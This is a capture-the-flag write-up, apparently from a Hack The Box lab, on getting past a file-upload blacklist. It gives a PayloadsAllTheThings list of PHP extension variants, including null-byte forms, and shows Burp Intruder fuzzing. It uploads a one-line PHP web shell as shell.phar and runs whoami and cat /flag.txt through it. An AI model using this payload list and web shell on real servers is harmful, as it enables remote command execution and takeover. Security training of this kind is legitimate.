## Challenge

Try to find an extension that is not blacklisted and can execute PHP code on the web server, and use it to read "/flag.txt" 

## Solution

Send the request to upload an image to the Burp Intruder.

I got the list of possible php extension from `payloadAllTheThings`:

```sh
.jpeg.php
.jpg.php
.png.php
.php
.php3
.php4
.php5
.php7
.php8
.pht
.phar
.phpt
.pgif
.phtml
.phtm
.php%00.gif
.php\x00.gif
.php%00.png
.php\x00.png
.php%00.jpg
.php\x00.jpg
```

Select the payload type as Simple list, and then on the payload configuration paste these extensions.

From the `filename` select the extension `.jpg` as a payload position, and start the attack.

Observe the length of the response, and see that some of the extensions are not blacklisted, as it shows it is successfully uploaded.

I tried a number of them like `.php3`, `php4`, `phtm`, `pht`, but they were not working - not executing the code, just showing it as plain text.

However, there was one extension `.phar` which allowed code extension.

For example `.phar`, is among them. 

I tried this by sending the request to the Burp Repeater and changing the filename to `shell.phar`, and putting the shell `<?php system($_REQUEST['cmd']); ?>` as the body.

We see that the shell has been uploaded and we view the source of the webpage, and we see that files are being uploaded at the `/profile_images/` directory.

Let's access the `shell.phar` and add the `cmd` with the value of the command that we want to execute.

With `http://94.237.53.128:51926/profile_images/shell.phar?cmd=whoami` I got the result as `www-data`.

Now let's read the flag at `/flag.txt` by going to `http://94.237.53.128:51926/profile_images/shell.phar?cmd=cat%20/flag.txt` and the result is `HTB{1_c4n_n3v3r_b3_bl4ckl1573d}`



